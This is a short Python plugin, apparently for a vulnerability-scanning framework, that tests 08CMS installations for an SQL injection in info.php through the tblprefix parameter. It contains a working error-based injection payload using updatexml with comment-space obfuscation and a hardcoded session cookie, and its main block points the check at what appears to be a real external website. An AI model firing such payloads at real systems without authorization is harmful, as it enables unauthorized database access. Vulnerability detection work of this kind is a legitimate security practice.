#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0110861
#__Author__ = 上善若水
#_PlugName_ = 08CMS_sql Plugin
#_FileName_ = 08CMS_sql.py

def assign(service, arg):
    if service == "08cms":
        return True, arg 	

def audit(arg):
    url = arg + "info.php?fid=1&tblprefix=cms_msession" 
    payload = "/**/where/**/1/**/and/**/updatexml(1,concat(0x37,(select/**/md5(520)/**/limit/**/0,1)),1)%23" 
    geturl = url + payload
    code, head, body, errcode, final_url = curl.curl2(geturl,cookie="umW_msid=rsLQWU")
    if code == 200 and 'cf67355a3333e6e143439161adc2d82e' in body:
        security_hole(url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('08cms', 'http://www.pxmfw.com/')[1])
